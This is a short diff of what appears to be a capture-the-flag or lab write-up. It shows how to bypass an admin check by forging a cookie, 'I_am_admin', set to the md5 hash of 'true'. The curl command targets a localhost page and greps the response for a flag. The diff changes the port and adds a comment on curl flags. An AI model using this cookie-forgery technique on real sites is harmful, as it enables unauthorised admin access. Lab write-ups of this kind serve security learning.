@@ -13,9 +13,8 @@ commands:
 echo -n "true" | md5sum
 # → b326b5062b2f0e69046810717534cb09
 
-# Send request with forged cookie
-curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
-     "http://localhost:8080/index.php?page=admin"
+# Send request with forged cookie -b is for cookie -H is for headers
+curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09"  "http://localhost:8081/index.php?page=admin" | grep Flag
 ```
 
 ## Discovery
